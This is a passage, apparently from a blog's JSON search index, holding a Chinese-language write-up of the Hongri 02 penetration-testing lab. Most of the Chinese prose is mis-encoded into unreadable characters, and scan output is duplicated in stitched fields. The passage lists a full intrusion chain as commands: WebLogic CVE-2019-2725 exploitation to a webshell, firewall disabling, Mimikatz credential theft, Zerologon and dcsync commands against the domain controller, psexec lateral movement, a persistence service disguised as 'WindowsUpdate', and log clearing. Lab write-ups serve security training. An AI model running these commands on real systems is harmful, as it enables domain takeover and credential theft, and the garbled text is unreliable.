|_weblogic-t3-info: T3 protocol in use (WebLogic version: 10.3.6.0) 49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49155/tcp open msrpc Microsoft Windows RPC 49160/tcp open msrpc Microsoft Windows RPC MAC Address: 00:0C:29:65:23:E2 (VMware) Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: phone|specialized|general purpose Running (JUST GUESSING): Microsoft Windows Phone|7|8.1|2008|Vista (94%) OS CPE: cpe:/o:microsoft:windows cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1:r1 cpe:/o:microsoft:windows_server_2008::beta3 cpe:/o:microsoft:windows_server_2008 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_8 Aggressive OS guesses: Microsoft Windows Phone 7.5 or 8.0 (94%), Microsoft Windows Embedded Standard 7 (93%), Microsoft Windows 8.1 R1 (92%), Microsoft Windows 7 (91%), Microsoft Windows Server 2008 or 2008 Beta 3 (90%), Microsoft Windows Server 2008 R2 or Windows 8.1 (90%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (90%), Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008 (90%), Microsoft Windows 7 Professional or Windows 8 (89%), Microsoft Windows Server 2008 SP1 (87%) No exact OS matches for host (test conditions non-ideal). Uptime guess: 0.050 days (since Mon Apr 29 07:28:28 2024) Network Distance: 1 hop TCP Sequence Prediction: Difficulty=264 (Good luck!) IP ID Sequence Generation: Incremental Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2024-04-29T12:40:31 |_ start_date: 2024-04-29T11:29:55 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2:1:0: |_ Message signing enabled but not required TRACEROUTE HOP RTT ADDRESS 1 0.81 ms 192.168.111.80 NSE: Script Post-scanning. Initiating NSE at 08:41 Completed NSE at 08:41, 0.00s elapsed Initiating NSE at 08:41 Completed NSE at 08:41, 0.00s elapsed Initiating NSE at 08:41 Completed NSE at 08:41, 0.00s elapsed Read data files from: /usr/bin/../share/nmap OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 215.02 seconds Raw packets sent: 2155 (99.940KB) | Rcvd: 31 (1.544KB) æ ¹æ®ç»“æœå¯çŸ¥æœåŠ¡å™¨æ“ä½œç³»ç»Ÿä¸ºWindows Server 2008 R2 - 2012ï¼Œä¸”å¼€å¯äº†80ã€135ã€139ã€445ã€1433ã€3389ã€7001ã€49152ã€49153ã€49154ç«¯å£\nå¦å¤–ï¼Œæœ‰å››ä¸ªå¯¹å¤–å¼€æ”¾ç«¯å£ï¼š\n3389ï¼šwindows RDPæœåŠ¡ 1433ï¼šmssqlæœåŠ¡ï¼ˆSQL serverï¼‰ 80ï¼šé»˜è®¤ç«¯å£ 7001ï¼šweblogicæœåŠ¡ï¼Œç‰ˆæœ¬ä¸º10.3.6 æˆ‘ä»¬å¯ä»¥æ®æ­¤è¿›è¡Œæ¨æµ‹ï¼š\n445ç«¯å£å¼€æ”¾æ„å‘³ç€å­˜åœ¨smbæœåŠ¡ï¼Œå¯èƒ½å­˜åœ¨ms17_010æ°¸æ’ä¹‹è“æ¼æ´\nå¼€æ”¾139ç«¯å£ï¼Œå°±å­˜åœ¨SambaæœåŠ¡ï¼Œå¯èƒ½å­˜åœ¨çˆ†ç ´/æœªæˆæƒè®¿é—®/è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´\næ”¾1433ç«¯å£ï¼Œå°±å­˜åœ¨mssqlæœåŠ¡ï¼Œå¯èƒ½å­˜åœ¨çˆ†ç ´/æ³¨å…¥/SAå¼±å£ä»¤\nå¼€æ”¾7001ç«¯å£å¯èƒ½å­˜åœ¨Weblogicååºåˆ—åŒ–æ¼æ´\nå…¥ä¾µå’Œæ„ŸæŸ“é˜¶æ®µï¼ˆæ¼æ´æ‰«æä¸åˆ©ç”¨ï¼‰ é’ˆå¯¹weblogicæ¼æ´æ‰«æ å¯ä»¥ä½¿ç”¨weblogicScannerå¯¹weblogicè¿›è¡Œæ¼æ´æ‰«æï¼š\npython ws.py -t 192.168.111.80:7001 ç»“æœå¦‚ä¸‹ï¼š\nç”±æ‰«æç»“æœå¯ä»¥å¾—å‡ºï¼Œè¯¥æœåŠ¡å™¨7001ç«¯å£å­˜åœ¨å¤šä¸ªååºåˆ—åŒ–RCEæ¼æ´ï¼Œå› æ­¤å¯ä»¥ä»è¿™äº›æ¼æ´å…¥æ‰‹è¿›è¡Œç›¸åº”æ¸—é€æ“ä½œ\nååºåˆ—åŒ–æ¼æ´æ”»å‡»weblogic è¿™é‡Œå°è¯•ä½¿ç”¨CVE-2019-2725è¿›è¡Œæ¼æ´åˆ©ç”¨\nä¸€å¼€å§‹å°è¯•åˆ©ç”¨MSFä¸Šçš„payloadï¼Œä½†åå‘è¿æ¥ä¸€ç›´å¤±è´¥\nå†å°è¯•githubä¸Šä¸€ä¸ªç»è¿‡å…æ€å¤„ç†çš„åˆ©ç”¨è„šæœ¬ï¼šGitHub - black-mirror/Weblogic: Weblogic CVE-2019-2725 CVE-2019-2729 Getshell å‘½ä»¤æ‰§è¡Œ\næ‰§è¡Œå‘½ä»¤ï¼š\npython weblogic_get_webshell.py http://192.168.111.80:7001 ä¸€æŠŠæ¢­äº†ï¼š\nè„šæœ¬è‡ªåŠ¨ç”Ÿæˆäº†ä¸€ä¸ªwebshellï¼Œç”±æ­¤å¯ä»¥å®ç°ä»»æ„å‘½ä»¤æ‰§è¡Œï¼Œä¸”å½“å‰æƒé™ä¸ºde1ay\\administrator\nå°è¯•æŸ¥çœ‹ipä¿¡æ¯ï¼š\nipconfig/all å›æ˜¾å¦‚ä¸‹ï¼š\nWindows IP é…ç½® ä¸»æœºå . . . . . . . . . . . . . : WEB ä¸» DNS åç¼€ . . . . . . . . . . . : de1ay.com èŠ‚ç‚¹ç±»å‹ . . . . . . . . . . . . : æ··åˆ IP è·¯ç”±å·²å¯ç”¨ . . . . . . . . . . : å¦ WINS ä»£ç†å·²å¯ç”¨ . . . . . . . . . : å¦ DNS åç¼€æœç´¢åˆ—è¡¨ . . . . . . . . : de1ay.com ä»¥å¤ªç½‘é€‚é…å™¨ æœ¬åœ°è¿æ¥ 2: è¿æ¥ç‰¹å®šçš„ DNS åç¼€ . . . . . . . : æè¿°. . . . . . . . . . . . . . . : Intel(R) PRO/1000 MT Network Connection #2 ç‰©ç†åœ°å€. . . . . . . . . . . . . : 00-0C-29-65-23-EC DHCP å·²å¯ç”¨ . . . . . . . . . . . : å¦ è‡ªåŠ¨é…ç½®å·²å¯ç”¨. . . . . . . . . . : æ˜¯ æœ¬åœ°é“¾æ¥ IPv6 åœ°å€. . . . . . . . : fe80::d193:8f36:bb49:8d84%13(é¦–é€‰) IPv4 åœ°å€ . . . . . . . . . . . . : 10.10.10.80(é¦–é€‰) å­ç½‘æ©ç  . . . . . . . . . . . . : 255.255.255.0 é»˜è®¤ç½‘å…³. . . . . . . . . . . . . : 10.10.10.1 DHCPv6 IAID . . . . . . . . . . . : 301993001 DHCPv6 å®¢æˆ·ç«¯ DUID . . . . . . . : 00-01-00-01-25-06-97-6A-00-0C-29-68-D3-5F DNS æœåŠ¡å™¨ . . . . . . . . . . . : 10.10.10.10 TCPIP ä¸Šçš„ NetBIOS . . . . . . . : å·²å¯ç”¨ ä»¥å¤ªç½‘é€‚é…å™¨ æœ¬åœ°è¿æ¥: è¿æ¥ç‰¹å®šçš„ DNS åç¼€ . . . . . . . : æè¿°. . . . . . . . . . . . . . . : Intel(R) PRO/1000 MT Network Connection ç‰©ç†åœ°å€. . . . . . . . . . . . . : 00-0C-29-65-23-E2 DHCP å·²å¯ç”¨ . . . . . . . . . . . : å¦ è‡ªåŠ¨é…ç½®å·²å¯ç”¨. . . . . . . . . . : æ˜¯ æœ¬åœ°é“¾æ¥ IPv6 åœ°å€. . . . . . . . : fe80::4d1:cc13:79f2:4cb1%11(é¦–é€‰) IPv4 åœ°å€ . . . . . . . . . . . . : 192.168.111.80(é¦–é€‰) å­ç½‘æ©ç  . . . . . . . . . . . . : 255.255.255.0 é»˜è®¤ç½‘å…³. . . . . . . . . . . . . : 192.168.111.1 DHCPv6 IAID . . . . . . . . . . . : 234884137 DHCPv6 å®¢æˆ·ç«¯ DUID . . . . . . . : 00-01-00-01-25-06-97-6A-00-0C-29-68-D3-5F DNS æœåŠ¡å™¨ . . . . . . . . . . . : 10.10.10.10 TCPIP ä¸Šçš„ NetBIOS . . . . . . . : å·²å¯ç”¨ éš§é“é€‚é…å™¨ isatap.{AD80CD23-D97F-4814-A715-9248D845EA0F}: åª’ä½“çŠ¶æ€ . . . . . . . . . . . . : åª’ä½“å·²æ–­å¼€ è¿æ¥ç‰¹å®šçš„ DNS åç¼€ . . . . . . . : æè¿°. . . . . . . . . . . . . . . : Microsoft ISATAP Adapter ç‰©ç†åœ°å€. . . . . . . . . . . . . : 00-00-00-00-00-00-00-E0 DHCP å·²å¯ç”¨ . . . . . . . . . . . : å¦ è‡ªåŠ¨é…ç½®å·²å¯ç”¨. . . . . . . . . . : æ˜¯ éš§é“é€‚é…å™¨ isatap.{D7E14072-49B9-45D3-BA8C-7955E6146CC2}: åª’ä½“çŠ¶æ€ . . . . . . . . . . . . : åª’ä½“å·²æ–­å¼€ è¿æ¥ç‰¹å®šçš„ DNS åç¼€ . . . . . . . : æè¿°. . . . . . . . . . . . . . . : Microsoft ISATAP Adapter #2 ç‰©ç†åœ°å€. . . . . . . . . . . . . : 00-00-00-00-00-00-00-E0 DHCP å·²å¯ç”¨ . . . . . . . . . . . : å¦ è‡ªåŠ¨é…ç½®å·²å¯ç”¨. . . . . . . . . . : æ˜¯ ç”±ç»“æœå¯çŸ¥è¯¥webæœåŠ¡å™¨å­˜åœ¨åŒç½‘å¡ï¼š\n10.10.10.80 192.168.111.80 å¹¶ä¸”å­˜åœ¨åŸŸde1ay.com\næ‰§è¡Œsysteminfoä¹Ÿå¯ä»¥å‘ç°å­˜åœ¨åŸŸde1ay.comï¼š\nå°è¯•ç”¨pingæ¥æŸ¥çœ‹åŸŸæ§çš„IPï¼š\n?cmd=ping+de1ay.com æŸ¥çœ‹å›æ˜¾ç¡®è®¤äº†DCçš„IPä¸º10.10.10.10\næŸ¥çœ‹ä¸€ä¸‹åå°ï¼š\n?cmd=tasklist å‘ç°åå°å­˜åœ¨360æ€è½¯\nåå¼¹è¿æ¥ä¸Šçº¿CS è€è§„çŸ©ï¼Œä½¿ç”¨CSç”Ÿæˆä¸€ä¸ªåå‘è¿æ¥çš„cmdçš„payloadï¼Œä¼ ç»™æˆ‘ä»¬çš„webshellï¼Œå³å¯æˆåŠŸä¸Šçº¿CS\nçœ‹è§æœ‰äº›æ–‡ç« åœ¨è¿™ä¸€æ­¥è¦è¿›è¡Œå…æ€ï¼Œä½†æˆ‘å¯ä»¥ç›´æ¥åè¿ï¼Œå¯èƒ½æ˜¯å› ä¸ºwebshellå·²ç»å…æ€å¤„ç†è¿‡ï¼ˆç•™ä¸ªç–‘é—®ï¼‰\næƒé™æå‡ è™½ç„¶å·²ç»æ˜¯adminæƒé™ï¼Œä½†å°è¯•ç›´æ¥getsystemä¼šå¯„æ‰ï¼Œå¯èƒ½æ˜¯360çš„åŸå› \nå› ä¸ºæˆ‘çš„CSè£…äº†æ¢¼æŒï¼Œä½¿ç”¨ms014-058è¿›è¡ŒææƒæˆåŠŸï¼Œè·å–åˆ°äº†systemæƒé™\næ¥ä¸‹æ¥å°†æ€è½¯å’Œé˜²ç«å¢™éƒ½å…³é—­ï¼š\nnetsh advfirewall set allprofiles state off #å…³é—­é˜²ç«å¢™ï¼ˆæ¢¼æŒæ’ä»¶ä¹Ÿæœ‰è¯¥åŠŸèƒ½ï¼‰ run killav #å…³é—­æ€è½¯ï¼Œå¤±è´¥äº† å°è¯•ç›´æ¥killæ‰360ä¹Ÿå¤±è´¥äº†ï¼š\ntaskkill /PID 3604 /F æŠ“å–æ“ä½œç³»ç»Ÿå‡­è¯ ä½¿ç”¨CSä¸Šçš„Mimikatzå¥—ä»¶è¯»å–æœ¬åœ°å¯†ç å’Œå“ˆå¸Œ\næŠ“å–åˆ°æœ¬æœºde1ayç”¨æˆ·çš„æ˜æ–‡å¯†ç ï¼š\nè¿˜æŠ“å–åˆ°äº†åŸŸç”¨æˆ·mssqlçš„æ˜æ–‡å¯†ç ï¼š\n3389ç«¯å£RDPç™»å½•weblogicæœåŠ¡å™¨ åœ¨nmapæ‰«ææ—¶ï¼Œè¯¥ä¸»æœºçš„3389ç«¯å£ä¸ºå¼€å¯çŠ¶æ€ï¼Œè€Œæˆ‘ä»¬å·²ç»è·å–äº†ç”¨æˆ·å¯†ç ï¼Œå¯ä»¥ç›´æ¥è¿›è¡Œè¿œç¨‹ç™»é™†\næ¢ç´¢æ„ŸçŸ¥é˜¶æ®µï¼ˆå†…ç½‘ä¿¡æ¯æœé›†ï¼‰ ä½¿ç”¨CSè‡ªå¸¦å·¥å…·è¿›è¡Œæ‰«æ\nå¯ä»¥å‘ç°åŸŸå†…å­˜åœ¨3å°ä¸»æœºï¼š\n10.10.10.10ï¼ˆåŸŸæ§ï¼‰ 10.10.10.80ï¼ˆå¤–ç½‘ä¸»æœºï¼‰ 10.10.10.201ï¼ˆ åŸŸç”¨æˆ·ä¸»æœºï¼‰ ä¼ æ’­é˜¶æ®µï¼ˆæ¨ªå‘ç§»åŠ¨ï¼‰ å°è¯•ä½¿ç”¨åŸŸç”¨æˆ·mssqlèº«ä»½è¿›è¡Œpsexecæ¨ªå‘ç§»åŠ¨å¤±è´¥äº†ï¼Œè¿™é‡Œå°è¯•ä½¿ç”¨zerologonæ¼æ´æ¥æ‰“DC\nåˆ©ç”¨zerologonæ¼æ´ï¼ˆCVE-2020-1472ï¼‰æ”»å‡»DC netlogonæ˜¯windowsä¸Šçš„ä¸€ä¸ªé‡è¦çš„åŠŸèƒ½ç»„ä»¶ï¼Œç”¨äºåœ¨åŸŸå†…ç½‘ç»œä¸Šè®¤è¯ç”¨æˆ·å’Œæœºå™¨ï¼Œå¤åˆ¶æ•°æ®åº“è¿›è¡ŒåŸŸæ§å¤‡ä»½ï¼Œç»´æŠ¤åŸŸæˆå‘˜ä¸åŸŸã€åŸŸä¸åŸŸæ§ã€åŸŸDCä¸è·¨åŸŸDCä¹‹é—´çš„å…³ç³»\nè€ŒZerologonæ¼æ´ï¼ˆCVE-2020-1472ï¼‰æŒ‡åœ¨NTLMè®¤è¯è¿‡ç¨‹ä¸­ï¼Œä½¿ç”¨netlogonå®‰å…¨é€šé“ä¸DCè¿æ¥æ—¶ï¼Œç”±äºè®¤è¯åè®®åŠ å¯†éƒ¨åˆ†å­˜åœ¨ç¼ºé™·ï¼Œæ”»å‡»è€…å¯ä»¥å°†DCç®¡ç†å‘˜ç”¨æˆ·å¯†ç è®¾ç½®ä¸ºç©ºï¼Œè¿›ä¸€æ­¥å®ç°å¯†ç å“ˆå¸Œè·å–å¹¶æœ€ç»ˆè·å–ç®¡ç†å‘˜æƒé™ï¼›æˆåŠŸåˆ©ç”¨è¯¥æ¼æ´å¯ä»¥å®ç°ä»¥ç®¡ç†å‘˜æƒé™ç™»é™†åŸŸæ§è®¾å¤‡ï¼Œå¹¶è¿›ä¸€æ­¥æ§åˆ¶æ•´ä¸ªåŸŸ\nï¼ˆæ¼æ´è¯¦æƒ…è§æˆ‘åšå®¢å¦ä¸€ç¯‡æ–‡ç« ï¼Œæš‚æœªå‘å¸ƒï¼‰\né¦–å…ˆéœ€è¦å°†Mimikatzé€šè¿‡è¿œç¨‹æ¡Œé¢ä¸Šä¼ åˆ°å¤–ç½‘ä¸»æœºä¸Šï¼Œå¹¶è¿è¡ŒMimikatzæ£€æµ‹æ˜¯å¦å­˜åœ¨Zerologonæ¼æ´ï¼Œåœ¨Mimikatzè¿è¡Œåä½¿ç”¨å‘½ä»¤ï¼š\nlsadump::zerologon /target:DC.de1ay.com /account:DC$ ç»“æœå¦‚å›¾ï¼Œæ¼æ´å­˜åœ¨\næ¥ä¸‹æ¥ç›´æ¥åˆ©ç”¨ï¼š\nlsadump::zerologon /target:DC.de1ay.com /account:DC$ /exploit ç»“æœå¦‚å›¾ï¼Œåˆ©ç”¨æˆåŠŸ\næ¥ä¸‹æ¥è·å–DCæœåŠ¡å™¨çš„ç™»å½•å‡­è¯ï¼š\nlsadump::dcsync /domain:de1ay.com /dc:DC.de1ay.com /user:administrator /authuser:DC$ /authdomain:de1ay /authpassword:\u0026#34;\u0026#34; /authntlm å¦‚å›¾ï¼Œæˆ‘ä»¬è·å–åˆ°äº†åŸŸæ§æœåŠ¡å™¨ä¸­Administratorç”¨æˆ·çš„å¯†ç å“ˆå¸Œï¼š\ne25bbe456dd96a635f4434511788e502 æ¥ä¸‹æ¥å³å¯é€šè¿‡MD5åœ¨çº¿è§£å¯†ç½‘ç«™æˆ–hashcatå¯¹å¯†ç å“ˆå¸Œè¿›è¡Œè§£å¯†ï¼Œè·å¾—å¯†ç çš„æ˜æ–‡ï¼š\nhongrisec@2024 æœ€åæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤æ¥æ¢å¤åŸŸæ§æœåŠ¡å™¨çš„å¯†ç ï¼Œé˜²æ­¢åŸŸæ§æœåŠ¡å™¨è„±åŸŸï¼š\nlsadump::postzerologon /target:de1ay.com /account:DC$ ä½¿ç”¨PsExecå°†DCä¸Šçº¿åˆ°CS æˆ‘ä»¬å·²ç»è·å–åˆ°äº†DCä¸ŠAdministratorç”¨æˆ·çš„æ˜æ–‡å¯†ç ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•å¤ç”¨è¯¥å£ä»¤è¿›è¡Œæ¨ªå‘ç§»åŠ¨\nå¯ä»¥åœ¨CSä¸­åˆ©ç”¨psexecè¿æ¥DCï¼š\né¦–å…ˆå°†è·å–åˆ°çš„DCçš„ç™»å½•å‡­æ®æ·»åŠ åˆ°CSçš„å‡­æ®ç®¡ç†å™¨ä¸­ï¼ˆview\u0026ndash;credentialsï¼‰ï¼š\næ¥ä¸‹æ¥åœ¨å¤–ç½‘ä¸»æœºçš„shellä¸Šåˆ›å»ºè·³æ¿ï¼ˆpivoting\u0026ndash;listenerï¼‰ï¼š\nä½¿ç”¨psexecæ¨ªå‘ç§»åŠ¨ï¼Œä½¿ç”¨æˆ‘ä»¬åˆ›å»ºçš„å‡­æ®ï¼š\næˆåŠŸè·å–DCçš„shellä¸”æƒé™ä¸ºsystemï¼š\nä¸Šçº¿åŸŸç”¨æˆ·ä¸»æœº åŒç†ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡psexecç»§ç»­å°è¯•æ¨ªå‘ç§»åŠ¨ï¼š\næˆåŠŸ\nè‡³æ­¤æˆ‘ä»¬æˆåŠŸæ‹¿ä¸‹äº†å†…ç½‘æ‰€æœ‰ä¸»æœº\næŒä¹…åŒ–ï¼ˆæƒé™ç»´æŒï¼‰ä¸æ¢å¤ï¼ˆç—•è¿¹æ¸…é™¤ï¼‰ é€šè¿‡CSæŒä¹…åŒ–æ§åˆ¶æœåŠ¡å™¨ å¯¹æœåŠ¡å™¨getshellåï¼Œä¸ºäº†é˜²æ­¢æ‰çº¿ï¼Œä»¥åŠé˜²æ­¢ç›®æ ‡æœåŠ¡å™¨é‡å¯åæƒé™ä¸¢å¤±ï¼Œéœ€è¦è¿›è¡Œæƒé™ç»´æŒï¼Œè¿™é‡Œå¯ä»¥é€‰æ‹©ä½¿ç”¨åˆ›å»ºserviceè¿›è¡Œæƒé™ç»´æŒ:\né¦–å…ˆç”Ÿæˆä¸€ä¸ªartifact.exeç”¨äºä¸Šçº¿æœåŠ¡å™¨ï¼š å°†è¯¥exeé€šè¿‡CSæ–‡ä»¶ç®¡ç†åŠŸèƒ½ä¸Šä¼ è‡³ç›®æ ‡æœåŠ¡å™¨çš„ä¸€ä¸ªç›®å½•ä¸­\næ‰§è¡Œå‘½ä»¤å¼€å¯ä¸€ä¸ªåä¸ºWindowsUpdateçš„æœåŠ¡ï¼Œè¯¥æœåŠ¡è¿è¡Œæ—¶ä¾¿ä¼šæ‰§è¡Œartifact.exeè¿æ¥CS\nsc create \u0026#34;WindowsUpdate\u0026#34; binpath= \u0026#34;cmd /c start \u0026#34;C:\\æ–‡ä»¶è·¯å¾„\\artifact.exe\u0026#34;\u0026#34;\u0026amp;\u0026amp;sc config \u0026#34;WindowsUpdate\u0026#34; start= auto\u0026amp;\u0026amp;net start WindowsUpdate è‡³æ­¤ï¼Œæˆ‘ä»¬å®Œæˆäº†æƒé™ç»´æŒçš„æ“ä½œï¼Œå³ä½¿æœåŠ¡å™¨é‡å¯ï¼Œä¼šè¯ä¾ç„¶èƒ½å¤Ÿå­˜åœ¨\næ¢å¤é˜¶æ®µ ä¸»è¦æ¶‰åŠå¯¹webshellã€å…¶ä»–ä¸Šä¼ çš„æ–‡ä»¶çš„åˆ é™¤ï¼Œä»¥åŠæ¸…é™¤ç³»ç»Ÿæ—¥å¿—ç­‰ï¼Œè¾¾åˆ°æ¸…ç†æ¸—é€æ“ä½œç—•è¿¹çš„ç›®çš„\næ€»ç»“ åœ¨æœ¬æ¬¡æ¸—é€è¿‡ç¨‹ä¸­ï¼Œæ¶‰åŠäº†å¦‚ä¸‹çŸ¥è¯†ç‚¹ä¸æ“ä½œï¼š\nweblogicååºåˆ—åŒ–æ¼æ´çš„åˆ©ç”¨ 360å®‰å…¨å«å£«çš„ç»•è¿‡ï¼ˆæ„Ÿè§‰è¿™ä¸ª360ååˆ†é¸¡è‚‹ï¼Œæ²¡æœ‰å¯¹è¿‡ç¨‹äº§ç”Ÿé˜»ç¢ï¼‰ CSçš„å„é¡¹åŠŸèƒ½ Zerologonï¼ˆCVE-2020-1472ï¼‰æ¼æ´çš„åˆ©ç”¨ ",
        "summary": "çº¢æ—¥é¶åœº02 æ¢ç´¢å‘ç°é˜¶æ®µï¼ˆä¿¡æ¯æœé›†ï¼‰ å·²çŸ¥å¤–ç½‘IPï¼š192.168.111.80ï¼Œå¯¹å…¶è¿›è¡ŒNmapæ‰«æ\nnmap -T4 -A -v 192.168.111.80 #ä½¿ç”¨-T4é€‰é¡¹è®¾ç½®æ‰«æé€Ÿåº¦ä¸ºå¿«é€Ÿï¼Œ-Aé€‰é¡¹å¯ç”¨æ“ä½œç³»ç»Ÿæ£€æµ‹ã€ç‰ˆæœ¬æ£€æµ‹å’Œè„šæœ¬æ‰«æï¼Œ-vé€‰é¡¹å¯ç”¨è¯¦ç»†è¾“å‡º ç»“æœå¦‚ä¸‹ï¼š\nPORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 7.5 |_http-title: Site doesn\u0026#39;t have a title. | http-methods: | Supported Methods: OPTIONS TRACE GET HEAD POST |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/7.5 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds 1433/tcp open ms-sql-s Microsoft SQL Server 2008 R2 10.50.4000.00; SP2 | ms-sql-info: | 192.168.111.80:1433: | Version: | name: Microsoft SQL Server 2008 R2 SP2 | number: 10.50.4000.00 | Product: Microsoft SQL Server 2008 R2 | Service pack level: SP2 | Post-SP patches applied: false |_ TCP port: 1433 | ms-sql-ntlm-info: | 192.168.111.80:1433: | Target_Name: DE1AY | NetBIOS_Domain_Name: DE1AY | NetBIOS_Computer_Name: WEB | DNS_Domain_Name: de1ay.com | DNS_Computer_Name: WEB.de1ay.com | DNS_Tree_Name: de1ay.com |_ Product_Version: 6.1.7601 | ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback | Issuer: commonName=SSL_Self_Signed_Fallback | Public Key type: rsa | Public Key bits: 1024 | Signature Algorithm: sha1WithRSAEncryption | Not valid before: 2024-04-29T11:29:28 | Not valid after: 2054-04-29T11:29:28 | MD5: 0922:47cc:d252:0c16:f6c2:b016:a65c:5bba |_SHA-1: a463:9836:8e4c:a84c:575d:f8a9:7dc8:4f66:4299:5f2a |_ssl-date: 2024-04-29T12:41:08+00:00; 0s from scanner time. 3389/tcp open tcpwrapped | rdp-ntlm-info: | Target_Name: DE1AY | NetBIOS_Domain_Name: DE1AY | NetBIOS_Computer_Name: WEB | DNS_Domain_Name: de1ay.com | DNS_Computer_Name: WEB.de1ay.com | DNS_Tree_Name: de1ay.com | Product_Version: 6.1.7601 |_ System_Time: 2024-04-29T12:40:29+00:00 | ssl-cert: Subject: commonName=WEB.de1ay.com | Issuer: commonName=WEB.de1ay.com | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha1WithRSAEncryption | Not valid before: 2024-04-28T11:30:12 | Not valid after: 2024-10-28T11:30:12 | MD5: 95dd:c1e4:588c:7e02:f29a:c6c5:a523:dfa6 |_SHA-1: 4404:e395:da84:2b4c:8506:06af:c749:d40a:cff7:9bc6 |_ssl-date: 2024-04-29T12:41:08+00:00; 0s from scanner time. 7001/tcp open http Oracle WebLogic Server 10.3.6.0 (Servlet 2.5; JSP 2.1; T3 enabled) |_http-title: Error 404--Not Found |_weblogic-t3-info: T3 protocol in use (WebLogic version: 10.3.6.0) 49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49155/tcp open msrpc Microsoft Windows RPC 49160/tcp open msrpc Microsoft Windows RPC MAC Address: 00:0C:29:65:23:E2 (VMware) Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: phone|specialized|general purpose Running (JUST GUESSING): Microsoft Windows Phone|7|8.1|2008|Vista (94%) OS CPE: cpe:/o:microsoft:windows cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1:r1 cpe:/o:microsoft:windows_server_2008::beta3 cpe:/o:microsoft:windows_server_2008 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_8 Aggressive OS guesses: Microsoft Windows Phone 7.5 or 8.0 (94%), Microsoft Windows Embedded Standard 7 (93%), Microsoft Windows 8.1 R1 (92%), Microsoft Windows 7 (91%), Microsoft Windows Server 2008 or 2008 Beta 3 (90%), Microsoft Windows Server 2008 R2 or Windows 8.1 (90%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (90%), Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008 (90%), Microsoft Windows 7 Professional or Windows 8 (89%), Microsoft Windows Server 2008 SP1 (87%) No exact OS matches for host (test conditions non-ideal). Uptime guess: 0.050 days (since Mon Apr 29 07:28:28 2024) Network Distance: 1 hop TCP Sequence Prediction: Difficulty=264 (Good luck!) IP ID Sequence Generation: Incremental Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2024-04-29T12:40:31 |_ start_date: 2024-04-29T11:29:55 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2:1:0: |_ Message signing enabled but not required TRACEROUTE HOP RTT ADDRESS 1 0.81 ms 192.168.111.80 NSE: Script Post-scanning. Initiating NSE at 08:41 Completed NSE at 08:41, 0.00s elapsed Initiating NSE at 08:41 Completed NSE at 08:41, 0.00s elapsed Initiating NSE at 08:41 Completed NSE at 08:41, 0.00s elapsed Read data files from: /usr/bin/../share/nmap OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 215.02 seconds Raw packets sent: 2155 (99.940KB) | Rcvd: 31 (1.544KB) æ ¹æ®ç»“æœå¯çŸ¥æœåŠ¡å™¨æ“ä½œç³»ç»Ÿä¸ºWindows Server 2008 R2 - 2012ï¼Œä¸”å¼€å¯äº†80ã€135ã€139ã€445ã€1433ã€3389ã€7001ã€49152ã€49153ã€49154ç«¯å£\n"
    }
,
    {
        "title": "çº¢æ—¥é¶åœº03",
        "link": "/My-Knowlege-Database/blog/%E6%B8%97%E9%80%8F/%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0/%E7%BA%A2%E6%97%A5/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA03/",
